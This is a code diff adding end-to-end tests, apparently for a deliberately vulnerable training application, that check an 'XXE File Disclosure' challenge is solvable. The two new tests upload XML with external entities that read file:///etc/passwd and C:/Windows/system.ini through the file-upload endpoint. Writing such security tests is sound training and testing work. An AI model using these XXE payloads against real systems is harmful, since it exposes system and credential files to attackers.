@@ -34,4 +34,31 @@ describe('/#/complain', () => {
     })
     protractor.expect.challengeSolved({ challenge: 'Upload Type' })
   })
+
+  describe('challenge "xxeFileDisclosure"', () => {
+    it('should be possible to retrieve file from Windows server via .xml upload with XXE attack', () => {
+      browser.executeScript(() => {
+        const data = new FormData()
+        const blob = new Blob([ '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]><foo>&xxe;</foo>' ], { type: 'application/xml' })
+        data.append('file', blob, 'xxeForWindows.xml')
+
+        const request = new XMLHttpRequest()
+        request.open('POST', '/file-upload')
+        request.send(data)
+      })
+    })
+
+    it('should be possible to retrieve file from Linux server via .xml upload with XXE attack', () => {
+      browser.executeScript(() => {
+        const data = new FormData()
+        const blob = new Blob([ '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>' ], { type: 'application/xml' })
+        data.append('file', blob, 'xxeForLinux.xml')
+
+        const request = new XMLHttpRequest()
+        request.open('POST', '/file-upload')
+        request.send(data)
+      })
+    })
+    protractor.expect.challengeSolved({ challenge: 'XXE File Disclosure' })
+  })
 })
